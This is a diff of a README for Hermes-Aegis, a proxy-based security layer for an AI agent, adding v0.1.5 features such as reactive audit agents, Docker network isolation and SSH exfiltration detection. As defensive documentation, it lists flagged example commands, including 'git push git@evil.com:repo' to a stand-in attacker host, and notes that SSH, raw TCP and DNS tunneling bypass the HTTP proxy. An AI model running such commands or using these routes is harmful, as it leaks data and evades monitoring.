@@ -2,8 +2,8 @@
 
 **Security hardening layer for Hermes Agent** — Prevents secret leakage, dangerous command execution, and unauthorized data exfiltration through proxy-based monitoring.
 
-[![Version](https://img.shields.io/badge/version-0.1.4-blue)]()
-[![Tests](https://img.shields.io/badge/tests-654%20passing-brightgreen)]()
+[![Version](https://img.shields.io/badge/version-0.1.5-blue)]()
+[![Tests](https://img.shields.io/badge/tests-739%20passing-brightgreen)]()
 [![Python](https://img.shields.io/badge/python-3.10%2B-blue)]()
 [![License](https://img.shields.io/badge/license-MIT-blue)]()
 
@@ -15,8 +15,12 @@ Hermes-Aegis wraps Hermes Agent with a transparent MITM proxy that:
 
 - **Blocks secret exfiltration** — scans all outbound HTTP for API keys, tokens, credentials
 - **Injects API keys** — secrets stay in your encrypted vault, never in agent memory
-- **Detects dangerous commands** — 27 risky patterns (shell injection, destructive ops, privesc)
+- **Detects dangerous commands** — 35 risky patterns (shell injection, destructive ops, privesc, SSH exfiltration)
 - **Blocks dangerous commands in gateway mode** — Patch 5 enforces blocking when `AEGIS_ACTIVE=1`
+- **Blocks SSH/non-HTTP exfiltration** — Docker network isolation + SSH/SCP/netcat command detection
+- **Reactive audit agents** — automated investigation and circuit breaker response to security events
+- **Scheduled reports** — periodic audit digest generation via hermes cron system
+- **Graceful session resume** — shows session ID and resume command on exit
 - **Rate-limits bursts** — detects suspicious data tunneling patterns; escalates to blocking on repeated anomalies
 - **Restricts domains** — optional allowlist for outbound connections
 - **Audit trail** — tamper-proof hash-chained log of all security events
@@ -120,16 +124,19 @@ Add any key with `hermes-aegis vault set KEY_NAME` — you'll be prompted for th
 
 ### Patch System
 
-`hermes-aegis install` applies 8 idempotent, reversible patches to hermes-agent source files:
+`hermes-aegis install` applies 11 idempotent, reversible patches to hermes-agent source files:
 
 | Patch | File | Purpose |
 |-------|------|---------|
 | 1–3 | `docker.py` | Add `forward_env` param, pass to `_Docker()`, translate localhost→`host.docker.internal` + remap cert paths |
 | 4 | `terminal_tool.py` | Wire `_aegis_forward` env vars at DockerEnvironment instantiation |
 | 5 | `terminal_tool.py` | Call `hermes-aegis scan-command` when `AEGIS_ACTIVE=1` for gateway blocking |
-| 6 | `hermes (startup)` | Inject "🛡️ Aegis Protection Activated" into banner when `AEGIS_ACTIVE=1` |
+| 6 | `hermes (startup)` | Inject "Aegis Protection Activated" into banner when `AEGIS_ACTIVE=1` |
 | 7 | `terminal_tool.py` | Forward hermes approval decisions into aegis audit trail |
 | 8 | `terminal_tool.py` | Inject container awareness (`AEGIS_CONTAINER_ISOLATED=1`) into approval flow |
+| 9 | `docker.py` | **Network isolation** — use internal Docker network when `AEGIS_ACTIVE=1` to block SSH/raw TCP |
+| 10 | `terminal_tool.py` | Container handshake — inject `AEGIS_CONTAINER_ISOLATED=1` awareness |
+| 11 | `minisweagent/log.py` | Suppress DEBUG-level Docker container logs from console under aegis |
 
 Key properties:
 - **Idempotent** — safe to run multiple times; already-applied patches are silently skipped
@@ -191,6 +198,28 @@ hermes-aegis approvals list      # Show cached approval decisions
 hermes-aegis approvals add PAT --decision allow|deny [--ttl SECONDS] [--reason TEXT]
 hermes-aegis approvals remove PAT # Remove cached pattern
 hermes-aegis approvals clear     # Clear all cached decisions
+
+# Reactive Agents (v0.1.5)
+hermes-aegis reactive init       # Create default reactive rules
+hermes-aegis reactive list       # Show rules and status
+hermes-aegis reactive test       # Dry-run rules against recent audit
+hermes-aegis reactive enable NAME  # Enable a rule
+hermes-aegis reactive disable NAME # Disable a rule
+
+# Scheduled Reports (v0.1.5)
+hermes-aegis report schedule --every 24h [--deliver telegram]  # Schedule periodic report
+hermes-aegis report schedule --cron "0 9 * * 1" --name weekly  # Cron schedule
+hermes-aegis report list         # List scheduled reports
+hermes-aegis report run          # Generate report immediately
+hermes-aegis report cancel ID    # Cancel scheduled report
+
+# Vault Lock (v0.1.5)
+hermes-aegis vault unlock        # Unlock vault after circuit breaker lock
+
+# tmux Session (v0.1.5)
+hermes-aegis screen              # Launch hermes-aegis run in a persistent tmux session
+hermes-aegis screen --attach     # Attach to existing aegis tmux session
+hermes-aegis screen --kill       # Kill the aegis tmux session
 ```
 
 ---
@@ -348,7 +377,13 @@ All stored in `~/.hermes-aegis/`:
 ├── approval-cache.json       # Persistent approval decisions (TTL + patterns)
 ├── proxy.pid                 # Running proxy PID + port + vault hash
 ├── proxy.log                 # Proxy stdout+stderr (crash traces, addon errors)
-└── proxy-config.json         # Proxy startup config (secrets deleted after read)
+├── proxy-config.json         # Proxy startup config (secrets deleted after read)
+├── reactive-agents.json      # Reactive agent rules (v0.1.5)
+├── .watcher-offset           # Watcher position persistence (v0.1.5)
+├── vault.lock                # Circuit breaker vault lock sentinel (v0.1.5)
+├── domain-blocklist.json     # Circuit breaker domain blocks (v0.1.5)
+├── .last-report-timestamp    # Last scheduled report time (v0.1.5)
+└── reports/                  # Investigation and digest reports (v0.1.5)
 ```
 
 ---
@@ -356,7 +391,7 @@ All stored in `~/.hermes-aegis/`:
 ## Development
 
 ```bash
-uv run pytest tests/ -q          # Run all tests (654 passing)
+uv run pytest tests/ -q          # Run all tests (739 passing)
 uv run pytest tests/security/ -v # Security tests only
 ```
 
@@ -366,7 +401,7 @@ uv run pytest tests/security/ -v # Security tests only
 src/hermes_aegis/
 ├── cli.py                 # CLI commands (including scan-command)
 ├── hook.py                # Hermes hook installer + old setup migration
-├── patches.py             # 8 idempotent patches for hermes-agent source
+├── patches.py             # 11 idempotent patches for hermes-agent source
 ├── utils.py               # Shared utilities (port finding, docker check, etc.)
 ├── proxy/
 │   ├── addon.py           # AegisAddon (inject keys, scan, rate limit)
@@ -376,7 +411,7 @@ src/hermes_aegis/
 │   └── injector.py        # API key injection logic
 ├── patterns/              # Detection patterns
 │   ├── secrets.py         # API key / credential patterns
-│   ├── dangerous.py       # 27 dangerous command patterns
+│   ├── dangerous.py       # 35 dangerous command patterns (incl. SSH exfiltration)
 │   ├── crypto.py          # Crypto wallet patterns
 │   └── shared_registry.py # Merges hermes-agent redact.py patterns at runtime
 ├── middleware/             # Security middleware chain
@@ -390,9 +425,92 @@ src/hermes_aegis/
 ├── vault/                 # Encrypted secret storage
 ├── config/                # Settings + domain allowlist
 ├── audit/                 # Hash-chained audit trail
-└── container/             # Docker builder/runner/handshake
-    ├── builder.py         # Docker image builder
-    └── handshake.py       # Container-Aegis handshake protocol
+├── container/             # Docker builder/runner/handshake
+│   ├── builder.py         # Docker image builder
+│   └── handshake.py       # Container-Aegis handshake protocol
+├── reactive/              # Reactive audit agents (v0.1.5)
+│   ├── rules.py           # Rule/Trigger dataclasses, JSON loading, defaults
+│   ├── watcher.py         # AuditFileWatcher — tails audit.jsonl
+│   ├── manager.py         # ReactiveAgentManager — evaluates rules, cooldowns
+│   ├── actions.py         # CircuitBreakerExecutor — defensive actions
+│   ├── agent_runner.py    # Spawns restricted AIAgent for investigations
+│   └── templates.py       # Report templates and prompt construction
+└── reports/               # Scheduled audit reports (v0.1.5)
+    ├── generator.py       # Audit statistics and report prompts
+    └── scheduler.py       # Hermes cron job management
+```
+
+---
+
+## Reactive Audit Agents (v0.1.5)
+
+Reactive agents watch the audit trail in real time and respond automatically to security events.
+
+```bash
+# Set up default rules
+hermes-aegis reactive init
+
+# Run hermes — watcher starts automatically
+hermes-aegis run
+```
+
+Three default rules are created:
+- **block-alert** — sends a notification on any blocked request
+- **anomaly-reporter** — spawns an investigation agent after 3+ rate anomalies in 60s
+- **exfiltration-response** — spawns an investigation agent with circuit breaker actions after 5+ blocked secrets in 120s
+
+Investigation agents run with a restricted toolset (no terminal, browser, or code execution) and can request defensive actions like `kill_proxy`, `lock_vault`, or `block_domain`.
+
+See [`docs/reactive-agents.md`](docs/reactive-agents.md) for the full configuration guide.
+
+---
+
+## SSH / Non-HTTP Exfiltration Defense (v0.1.5)
+
+The aegis proxy only intercepts HTTP/HTTPS. SSH, raw TCP, and DNS tunneling bypass it. v0.1.5 adds two defense layers:
+
+**Layer 1: Network isolation** — New Patch 9 uses Docker's internal network mode when `AEGIS_ACTIVE=1`. Containers have no outbound route except through the proxy. SSH, raw TCP, UDP all fail at the network level. Only activates under `hermes-aegis run`; bare `hermes` is unaffected.
+
+**Layer 2: Command detection** — 8 new dangerous command patterns flag SSH/SCP/SFTP/netcat/socat/git-SSH operations. In audit mode (default), these are logged. In gateway blocking mode, they are denied.
+
+```bash
+# These are now detected:
+ssh user@host              # flagged
+scp file user@host:        # flagged
+git push git@evil.com:repo # flagged
+
+# These are NOT flagged:
+git push https://github.com/repo  # HTTPS goes through proxy
+curl https://example.com          # HTTPS goes through proxy
+```
+
+---
+
+## Persistent Sessions with tmux (v0.1.5)
+
+For long-running or overnight aegis sessions:
+
+```bash
+hermes-aegis screen              # Launch in a new tmux session
+hermes-aegis screen --attach     # Reattach to an existing session
+hermes-aegis screen --kill       # Kill the session
+```
+
+This creates a `hermes-aegis` tmux session that survives terminal closure, screen locks, and SSH disconnects.
+
+---
+
+## Graceful Exit with Session Resume (v0.1.5)
+
+When hermes exits (normally, via Ctrl+C, or due to proxy failure), aegis now shows session resume information:
+
+```
+Resume this session with:
+  hermes-aegis run -- --resume 20260315_184131_2ee222
+
+Session:        20260315_184131_2ee222
+Duration:       1h 20m 3s
+Messages:       130
 ```
 
 ---
